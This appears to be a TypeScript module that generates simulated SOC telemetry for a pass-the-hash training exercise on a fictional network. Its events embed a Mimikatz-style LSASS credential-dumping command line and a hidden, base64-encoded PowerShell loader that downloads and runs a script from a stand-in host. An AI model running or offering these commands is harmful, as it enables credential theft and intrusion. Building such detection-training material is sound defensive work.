/**
 * Events-only half of the ./lateralMovementPth.ts scenario pack.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./lateralMovementPth.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import {
  winLogon, winSpecialPrivileges, winShareAccess, winServiceInstall, winProcessCreate, winCredentialValidation, winDetailedShareAccess,
} from "@/lib/sim/emitters/windowsSecurity";
import { sysmonProcess, sysmonNetwork, sysmonProcessAccess, sysmonFile, sysmonDns } from "@/lib/sim/emitters/sysmon";
import { csAlert } from "@/lib/sim/emitters/crowdstrike";
import { sentinelAlert } from "@/lib/sim/emitters/sentinel";
import { panConnection } from "@/lib/sim/emitters/paloalto";

/** Telemetry half of the lateralMovementPth scenario: the events and the story title, no answer key. */
export function lateralMovementPthScenarioEvents() {
  const title = "Night-time privileged logons for an infrastructure admin";
  const B = new Date("2026-08-27T02:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  // The lateral-movement case on the servers, and the credential-theft case on the foothold
  // workstation: two different hosts, two separate process trees, two EDR cases.
  const INCIDENT = "inc:lm:1";
  const INCIDENT_WS = "inc:lm:2";

  // The foothold workstation (where the hash was dumped), the file server the operator
  // moves to, and the DC the second hop reaches.
  const foothold = { hostname: "FIN-WS-11", fqdn: "FIN-WS-11.nexacorp.com", ip: "10.20.6.41" };
  const fileSrv  = { hostname: "SRV-FILE-03", fqdn: "SRV-FILE-03.nexacorp.com", ip: "10.20.7.28" };
  const dc       = { hostname: "DC-NEXA-01", fqdn: "DC-NEXA-01.nexacorp.com", ip: "10.20.5.10" };
  // The admin host s.kessler remoted in from the afternoon before — why her hash was cached on FIN-WS-11.
  const adminHost = { hostname: "ADM-WS-04", ip: "10.20.9.15" };

  // The abused account: an infrastructure admin whose cached credentials sat in
  // LSASS on FIN-WS-11 after she remoted in to fix it — local-admin on servers,
  // exactly the account an operator wants.
  const admin = { sam: "s.kessler", email: "s.kessler@nexacorp.com", title: "Infrastructure Administrator" };
  const adminSid = "S-1-5-21-3421479547-3897544621-1789562108-2205";

  // The benign control: an ordinary finance user reaching the same share the
  // legitimate way — Kerberos, from her own workstation, in business hours.
  const benign = { sam: "m.rossi", email: "m.rossi@nexacorp.com" };
  const benignSid = "S-1-5-21-3421479547-3897544621-1789562108-3318";
  const benignWs = { hostname: "FIN-WS-22", ip: "10.20.6.52" };

  // The credential dumper (an unsigned binary named like a service host), and the remotely-installed service payload.
  const dumperHash = makeSha256("lateralmovement_pth_masqueraded_lsass_dumper_2026");
  const svcBinaryHash = makeSha256("lateralmovement_pth_svcupd64_service_binary_2026");
  const psHash = makeSha256("windows_system32_powershell_exe_signed_microsoft_2026");
  const sensorId = "b83f2c1e7d9a4056b1d4e8720af3c915";

  const cxNexa = "nexacorp" as const;
  const SYSTEM = "NT AUTHORITY\\SYSTEM";
  const PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const DUMPER = "C:\\Windows\\Temp\\svchost.exe";
  const ADMIN_PRIVS = "SeSecurityPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeImpersonatePrivilege";
  const LOADER_CMD = "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB3AGkAbgB1AHAAZABhAHQAZQAuAG4AZQB0AC8AYwAuAHAAcwAxACcAKQA=";

  /** A Sysmon row for a process that runs as SYSTEM: the account is the token owner, not the user the story names. */
  const asSystem = (e: TelemetryEvent): TelemetryEvent => {
    e.raw["winlog.event_data.User"] = SYSTEM;
    if (e.process) e.process = { ...e.process, user: SYSTEM };
    return e;
  };
  const loaderProc = { name: "powershell.exe", pid: 8260, path: PS, parent_name: "svcupd64.exe", parent_pid: 8104, cmdline: LOADER_CMD, user: SYSTEM, integrity: "system" as const };

  const events: TelemetryEvent[] = [
    // 0. BENIGN CONTROL — the legitimate way to reach SRV-FILE-03 (Kerberos, own WS, business hours).
    {
      ...winLogon({
        companyId: cxNexa, id: "evt_lm_00_benign_logon", ts: "2026-08-26T13:12:04.000Z", host: fileSrv.hostname, fqdn: fileSrv.fqdn, logSource: "windows_security",
        targetUser: benign.sam, targetSid: benignSid, srcIp: benignWs.ip, logonType: 3, authPackage: "Kerberos", logonProcess: "Kerberos",
        logonId: "0x5A11C02", srcPort: "50142", workstation: benignWs.hostname, recordId: "5540912", severity: "informational",
        description:
          "A 4624 network logon for m.rossi on SRV-FILE-03 at 13:12 the previous afternoon, LogonType 3 over Kerberos, from her own workstation FIN-WS-22.",
      }),
      fp_explanation:
        "Legitimate Type-3 network logon to the file server: Kerberos (the in-domain default), from the user's OWN workstation FIN-WS-22, at 13:12 on a business day. Same 4624 / LogonType 3 as the attack — the difference is the authentication package, the source host, and the hour.",
    },

    // 0a. WHY THE HASH WAS THERE — s.kessler remoted into FIN-WS-11 the afternoon before (4624, LogonType 10).
    winLogon({
      companyId: cxNexa, id: "evt_lm_00a_cached_logon", ts: "2026-08-26T16:20:11.000Z", host: foothold.hostname, fqdn: foothold.fqdn, logSource: "windows_security",
      targetUser: admin.sam, targetSid: adminSid, srcIp: adminHost.ip, logonType: 10, authPackage: "Negotiate", logonProcess: "User32 ",
      logonId: "0x3A17C55", srcPort: "58211", workstation: adminHost.hostname, recordId: "6180245", severity: "informational", incidentId: INCIDENT_WS,
      description:
        "A 4624 on FIN-WS-11 at 16:20 the previous afternoon: s.kessler logged on over Remote Desktop (LogonType 10) from the admin workstation ADM-WS-04, leaving her credentials cached on the machine.",
    }),

    // 0b. The credential dumper is written to disk (Sysmon 11) and started (Sysmon 1) — an unsigned binary named like a service host.
    {
      ...sysmonFile({
        companyId: cxNexa, id: "evt_lm_00b_dumper_written", ts: T(-20 * SEC), host: foothold.hostname, user: null, srcIp: foothold.ip,
        processName: "powershell.exe", processPath: PS, pid: 6100, path: DUMPER, sha256: dumperHash, fileSize: 1_355_264,
        severity: "medium", incidentId: INCIDENT_WS, mitre: "T1105", tactic: "Command and Control",
        description: "Sysmon Event 11 on FIN-WS-11: powershell.exe wrote C:\\Windows\\Temp\\svchost.exe, 1.3 MB, twenty seconds before the LSASS access.",
      }),
      process: { name: "powershell.exe", pid: 6100, path: PS, user: SYSTEM, integrity: "system" as const },
    },
    asSystem(sysmonProcess({
      companyId: cxNexa, id: "evt_lm_00c_dumper_exec", ts: T(-5 * SEC), host: foothold.hostname, user: null, srcIp: foothold.ip,
      processName: "svchost.exe", processPath: DUMPER, cmdline: `${DUMPER} "privilege::debug" "sekurlsa::logonpasswords" "exit"`,
      parentName: "powershell.exe", parentPath: PS, parentCmdline: "powershell.exe", pid: 6624, parentPid: 6100, sha256: dumperHash, signed: false,
      integrity: "System", originalFileName: "-", runAsUser: SYSTEM, severity: "high", incidentId: INCIDENT_WS, mitre: "T1036.005", tactic: "Stealth",
      description: "Sysmon Event 1 on FIN-WS-11: powershell.exe started an unsigned svchost.exe from C:\\Windows\\Temp as SYSTEM — a real svchost.exe lives in System32 and is started by services.exe.",
    })),

    // 1. THE SOURCE OF THE HASH — LSASS access on the foothold (Sysmon 10).
    asSystem(sysmonProcessAccess({
      companyId: cxNexa, id: "evt_lm_01_lsass_access", ts: T(0), host: foothold.hostname, user: null, srcIp: foothold.ip,
      sourceImage: DUMPER, sourcePid: 6624, targetPid: 712, grantedAccess: "0x1410",
      callTrace: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d234|C:\\Windows\\System32\\KERNELBASE.dll+2a1ee|UNKNOWN(0000000abc120000)",
      mitre: "T1003.001", tactic: "Credential Access", severity: "high", incidentId: INCIDENT_WS,
      description:
        "On the foothold host FIN-WS-11 a process running from C:\\Windows\\Temp opened lsass.exe with GrantedAccess 0x1410 at 02:00 — the read/query rights a credential dumper uses to lift hashes from memory.",
    })),

    // 2a. The DC validates the NTLM authentication the file server passed through (4776, workstation = the client's name).
    winCredentialValidation({
      companyId: cxNexa, id: "evt_lm_02a_dc_ntlm_validation", ts: T(4 * MIN), host: dc.hostname, fqdn: dc.fqdn, targetUser: admin.sam, targetSid: adminSid,
      workstation: foothold.hostname, status: "0x0", recordId: "9920201", severity: "low", incidentId: INCIDENT,
      description: "A 4776 on DC-NEXA-01 at 02:04:00: the domain controller validated s.kessler's NTLM credentials for a logon coming from the workstation FIN-WS-11.",
    }),

    // 2. THE PASS-THE-HASH LANDING — an ordinary-looking 4624, but NTLM, off-hours.
    winLogon({
      companyId: cxNexa, id: "evt_lm_02_pth_logon", ts: T(4 * MIN), host: fileSrv.hostname, fqdn: fileSrv.fqdn, logSource: "windows_security",
      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, logonType: 3, authPackage: "NTLM", logonProcess: "NtLmSsp ",
      lmPackage: "NTLM V2", keyLength: "0", logonId: "0x6C41F70", srcPort: "49277", workstation: foothold.hostname, recordId: "5551338",
      mitre: "T1550.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
      description:
        "A 4624 network logon for s.kessler arrived on SRV-FILE-03 at 02:04, LogonType 3 over NTLM, from FIN-WS-11 (10.20.6.41) — a user workstation reaching a file server as an infrastructure admin, at night.",
    }),

    // 3. 4672 — the logon carried admin privileges.
    { ...winSpecialPrivileges({
      companyId: cxNexa, id: "evt_lm_03_special_privs", ts: T(4 * MIN + 6 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn, logSource: "windows_security",
      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, logonId: "0x6C41F70", recordId: "5551339",
      privilegeList: ADMIN_PRIVS,
      mitre: "T1078", tactic: "Privilege Escalation", severity: "medium", incidentId: INCIDENT,
      description:
        "A 4672 on SRV-FILE-03 assigned SeDebugPrivilege, SeBackupPrivilege and SeImpersonatePrivilege to the s.kessler logon session — this NTLM network logon is running with local-administrator rights.",
    }), source: "windows_security" as const },

    // 4. 5140 — ADMIN$ opened (the PsExec SMB channel).
    { ...winShareAccess({
      companyId: cxNexa, id: "evt_lm_04_admin_share", ts: T(4 * MIN + 22 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows",
      subjectLogonId: "0x6C41F70", recordId: "5551361", mitre: "T1021.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
      description:
        "SRV-FILE-03 logged a 5140 connection to the ADMIN$ administrative share under the s.kessler session from 10.20.6.41 — the hidden share used to stage and launch remote code, not a normal file access.",
    }), source: "windows_security" as const },

    // 4a. 5145 — svcupd64.exe is written through ADMIN$ (WriteData), then 4b. Sysmon 11 records the file landing (written by System).
    { ...winDetailedShareAccess({
      companyId: cxNexa, id: "evt_lm_04a_payload_share_write", ts: T(4 * MIN + 38 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows",
      relativeTargetName: "svcupd64.exe", accessMask: "0x2", accessList: "%%4417", subjectLogonId: "0x6C41F70", recordId: "5551378",
      mitre: "T1021.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
      description: "A 5145 on SRV-FILE-03: s.kessler's session requested WriteData on svcupd64.exe under the ADMIN$ share from 10.20.6.41.",
    }), source: "windows_security" as const },
    {
      ...sysmonFile({
        companyId: cxNexa, id: "evt_lm_04b_payload_written", ts: T(4 * MIN + 40 * SEC), host: fileSrv.hostname, user: null, srcIp: fileSrv.ip,
        processName: "System", processPath: "System", pid: 4, path: "C:\\Windows\\svcupd64.exe", sha256: svcBinaryHash, fileSize: 77_824,
        severity: "high", incidentId: INCIDENT, mitre: "T1570", tactic: "Lateral Movement",
        description: "Sysmon Event 11 on SRV-FILE-03: the System process (the SMB server) created C:\\Windows\\svcupd64.exe, 76 KB, two seconds after the ADMIN$ write request.",
      }),
      process: { name: "System", pid: 4, path: "System", user: SYSTEM, integrity: "system" as const },
    },

    // 5. 7045 — a service is installed remotely.
    winServiceInstall({
      companyId: cxNexa, id: "evt_lm_05_service_install", ts: T(5 * MIN), host: fileSrv.hostname, fqdn: fileSrv.fqdn, logSource: "windows_security",
      targetUser: admin.sam, userEmail: null, installerSid: adminSid, srcIp: foothold.ip, serviceName: "WinSvcUpdate", imagePath: "C:\\Windows\\svcupd64.exe",
      accountName: "LocalSystem", serviceType: "user mode service", startType: "auto start", recordId: "884012",
      mitre: "T1569.002", tactic: "Execution", severity: "high", incidentId: INCIDENT,
      description:
        "A 7045 on SRV-FILE-03 recorded a new auto-start service, WinSvcUpdate, whose binary C:\\Windows\\svcupd64.exe runs as LocalSystem — a service created over the ADMIN$ session moments after the NTLM logon.",
    }),

    // 6. Sysmon 1 — the service binary executes as SYSTEM.
    sysmonProcess({
      companyId: cxNexa, id: "evt_lm_06_service_exec", ts: T(5 * MIN + 9 * SEC), host: fileSrv.hostname, user: null, srcIp: fileSrv.ip,
      processName: "svcupd64.exe", processPath: "C:\\Windows\\svcupd64.exe", cmdline: "C:\\Windows\\svcupd64.exe",
      parentName: "services.exe", parentPath: "C:\\Windows\\System32\\services.exe", pid: 8104, parentPid: 720,
      sha256: svcBinaryHash, signed: false, integrity: "System", originalFileName: "svcupd64.exe", runAsUser: SYSTEM,
      mitre: "T1569.002", tactic: "Execution", severity: "high", incidentId: INCIDENT,
      description:
        "Sysmon recorded services.exe on SRV-FILE-03 spawning C:\\Windows\\svcupd64.exe as LocalSystem — the installed service starting, an unsigned binary launched by the Service Control Manager.",
    }),

    // 7. 4688 — the payload spawns an encoded PowerShell child (creator and new process both SYSTEM).
    (() => {
      const e = winProcessCreate({
        companyId: cxNexa, id: "evt_lm_07_payload_powershell", ts: T(5 * MIN + 12 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
        targetUser: "SRV-FILE-03$", userEmail: null, srcIp: fileSrv.ip, processName: "powershell.exe", processPath: PS,
        cmdline: LOADER_CMD, parentPath: "C:\\Windows\\svcupd64.exe", pid: 8260, subjectUser: "SRV-FILE-03$", subjectSid: "S-1-5-18",
        runAsUser: SYSTEM, integrity: "system", tokenElevation: "%%1936", recordId: "5551402",
        mitre: "T1059.001", tactic: "Execution", severity: "high", incidentId: INCIDENT,
        description:
          "A 4688 on SRV-FILE-03 shows svcupd64.exe spawning an encoded, hidden-window PowerShell as SYSTEM — the remotely-installed service acting as a loader.",
      });
      e.source = "windows_security";
      e.process = { ...e.process!, parent_pid: 8104 };
      return e;
    })(),

    // 7a. The loader resolves its download host (Sysmon 22), 7b. connects (Sysmon 3), 7c. and the firewall logs the session.
    { ...asSystem(sysmonDns({
      companyId: cxNexa, id: "evt_lm_07a_payload_dns", ts: T(5 * MIN + 13 * SEC), host: fileSrv.hostname, user: null, srcIp: fileSrv.ip,
      processName: "powershell.exe", processPath: PS, pid: 8260, domain: "cdn-winupdate.net", resolvedIp: "185.174.137.26", severity: "medium",
      incidentId: INCIDENT, mitre: "T1105", tactic: "Command and Control",
      description: "Sysmon Event 22 on SRV-FILE-03: powershell.exe resolved cdn-winupdate.net to 185.174.137.26.",
    })), process: loaderProc },
    { ...asSystem(sysmonNetwork({
      companyId: cxNexa, id: "evt_lm_07b_payload_download", ts: T(5 * MIN + 14 * SEC), host: fileSrv.hostname, user: null, srcIp: fileSrv.ip,
      processName: "powershell.exe", processPath: PS, pid: 8260, remoteIp: "185.174.137.26", remotePort: 80, remoteHost: "cdn-winupdate.net",
      transport: "tcp", mitre: "T1105", tactic: "Command and Control", severity: "high", incidentId: INCIDENT,
      description:
        "Sysmon recorded the SYSTEM PowerShell on SRV-FILE-03 opening an outbound TCP/80 connection to cdn-winupdate.net (185.174.137.26) two seconds after it started — a server fetching a script from the internet, not a Microsoft update host.",
    })), process: loaderProc },
    panConnection({
      companyId: cxNexa, id: "evt_lm_07c_payload_fw", ts: T(5 * MIN + 17 * SEC), host: fileSrv.hostname, srcIp: fileSrv.ip, user: null,
      domain: "cdn-winupdate.net", dstIp: "185.174.137.26", remotePort: 80, app: "web-browsing", transport: "tcp", action: "allow", end: true,
      category: "unknown", bytesOut: 612, bytesIn: 18_944, elapsedSec: 3, severity: "high", incidentId: INCIDENT,
      description: "The firewall logged the SRV-FILE-03 session to 185.174.137.26:80 at 02:05:17: 612 bytes out, 18.9 KB back, allowed, URL category unknown.",
    }),

    // 8. Sysmon 3 — the payload reaches toward the DC over SMB (445).
    { ...asSystem(sysmonNetwork({
      companyId: cxNexa, id: "evt_lm_08_smb_to_dc", ts: T(6 * MIN), host: fileSrv.hostname, user: null, srcIp: fileSrv.ip,
      processName: "powershell.exe", processPath: PS, pid: 8260, remoteIp: dc.ip, remotePort: 445, remoteHost: dc.fqdn,
      transport: "tcp", mitre: "T1021.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
      description:
        "Sysmon recorded powershell.exe on SRV-FILE-03 opening an outbound TCP/445 (SMB) connection to DC-NEXA-01 (10.20.5.10) — the operator pivoting from the file server toward a Domain Controller.",
    })), process: loaderProc },

    // 9. CrowdStrike Falcon detection — the remote-service pattern (edr_scope hybrid).
    {
      ...csAlert({
        companyId: cxNexa, id: "evt_lm_09_edr_detection", ts: T(6 * MIN + 40 * SEC), host: fileSrv.hostname, user: admin.email, srcIp: fileSrv.ip,
        threatName: "PassTheHashRemoteServiceExecution", mitre: "T1550.002", tactic: "Lateral Movement",
        technique: "Use Alternate Authentication Material: Pass the Hash", processTree: "services.exe > svcupd64.exe > powershell.exe",
        runAsUser: SYSTEM, severity: "critical", action: "detected", incidentId: INCIDENT,
        description:
          "Falcon raised a Critical detection on SRV-FILE-03: an NTLM network logon for a privileged account from a workstation, followed by a remotely-installed service and an encoded PowerShell opening SMB to DC-NEXA-01 — a pass-the-hash lateral-movement pattern.",
      }),
      edr_scope: "hybrid",
    },

    // 10. THE SECOND HOP — the DC validates the same hash (4776), logs the logon (4624, 4672) and the first thing done on it (5145 svcctl).
    winCredentialValidation({
      companyId: cxNexa, id: "evt_lm_10a_dc_ntlm_validation", ts: T(8 * MIN), host: dc.hostname, fqdn: dc.fqdn, targetUser: admin.sam, targetSid: adminSid,
      workstation: fileSrv.hostname, status: "0x0", recordId: "9920547", severity: "low", incidentId: INCIDENT,
      description: "A 4776 on DC-NEXA-01 at 02:08:00: the domain controller validated s.kessler's NTLM credentials for a logon coming from the server SRV-FILE-03.",
    }),
    winLogon({
      companyId: cxNexa, id: "evt_lm_10_dc_logon", ts: T(8 * MIN), host: dc.hostname, fqdn: dc.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: fileSrv.ip, logonType: 3, authPackage: "NTLM", logonProcess: "NtLmSsp ",
      lmPackage: "NTLM V2", keyLength: "0", logonId: "0x8B03D19", srcPort: "52140", workstation: fileSrv.hostname, recordId: "9920551",
      mitre: "T1550.002", tactic: "Lateral Movement", severity: "critical", incidentId: INCIDENT,
      description:
        "A 4624 network logon for s.kessler landed on DC-NEXA-01 at 02:08, LogonType 3 over NTLM, this time sourced from SRV-FILE-03 (10.20.7.28) — the same replayed hash reaching a Domain Controller one hop on.",
    }),
    winSpecialPrivileges({
      companyId: cxNexa, id: "evt_lm_10b_dc_privileges", ts: T(8 * MIN + SEC), host: dc.hostname, fqdn: dc.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: fileSrv.ip, logonId: "0x8B03D19", recordId: "9920552", privilegeList: ADMIN_PRIVS,
      severity: "medium", incidentId: INCIDENT,
      description: "A 4672 on DC-NEXA-01: special privileges assigned to the s.kessler logon session that arrived from SRV-FILE-03.",
    }),
    winDetailedShareAccess({
      companyId: cxNexa, id: "evt_lm_10c_dc_svcctl", ts: T(8 * MIN + 20 * SEC), host: dc.hostname, fqdn: dc.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: fileSrv.ip, shareName: "\\\\*\\IPC$", shareLocalPath: "",
      relativeTargetName: "svcctl", accessMask: "0x3", accessList: "%%4416 %%4417", subjectLogonId: "0x8B03D19", recordId: "9920560",
      mitre: "T1021.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
      description: "A 5145 on DC-NEXA-01: the s.kessler session from SRV-FILE-03 opened the svcctl pipe under IPC$ — the Service Control Manager RPC endpoint used to create a service remotely.",
    }),

    // 11. Sentinel correlation, fed by a Defender for Identity alert — the multi-hop chain.
    (() => {
      const a = sentinelAlert({
        companyId: cxNexa, id: "evt_lm_11_sentinel_correlation", ts: T(9 * MIN), user: admin.email, srcIp: foothold.ip,
        alertName: "PrivilegedAccount_NTLM_MultiHostChain", severity: "high", eventType: "ueba_anomaly", ruleId: "SEN-IDENT-0342",
        tactic: "Lateral Movement", fullName: "Sofia Kessler", department: "IT Infrastructure", title: admin.title,
        productName: "Azure Advanced Threat Protection", providerName: "AATP",
        entities: [
          { "$id": "1", Type: "account", Name: admin.sam, UPNSuffix: "nexacorp.com", NTDomain: "NEXACORP", Sid: adminSid },
          { "$id": "2", Type: "host", HostName: foothold.hostname, DnsDomain: "nexacorp.com", FQDN: foothold.fqdn },
          { "$id": "3", Type: "host", HostName: fileSrv.hostname, DnsDomain: "nexacorp.com", FQDN: fileSrv.fqdn },
          { "$id": "4", Type: "host", HostName: dc.hostname, DnsDomain: "nexacorp.com", FQDN: dc.fqdn },
          { "$id": "5", Type: "ip", Address: foothold.ip },
        ],
        extendedProperties: {
          "Authentication Package": "NTLM",
          "Hosts In Path": ["FIN-WS-11", "SRV-FILE-03", "DC-NEXA-01"],
          "Window Start": T(4 * MIN),
          "Window End": T(8 * MIN),
          "Usual Logon Hours": "08:00-19:00",
          "Usual Auth Protocol": "Kerberos",
          "Source Addresses In Window": [foothold.ip, fileSrv.ip],
        },
        description:
          "Sentinel raised a correlation alert from a Defender for Identity detection for s.kessler: NTLM authentications traversing FIN-WS-11 -> SRV-FILE-03 -> DC-NEXA-01 in nine minutes off-hours, with the account's normal logon pattern attached for comparison.",
      });
      // A cross-host identity alert: no single machine owns it, and the raw carries no technique label.
      delete a.hostname;
      a.mitre_technique = "T1550.002";
      delete a.raw["Techniques"];
      a.raw["CompromisedEntity"] = admin.email;
      a.incident_id = INCIDENT;
      return a;
    })(),
  ];

  return { title, events, B, T, MIN, SEC, INCIDENT, INCIDENT_WS, foothold, fileSrv, dc, adminHost, admin, adminSid, benign, benignSid, benignWs, svcBinaryHash, dumperHash, sensorId, cxNexa };
}
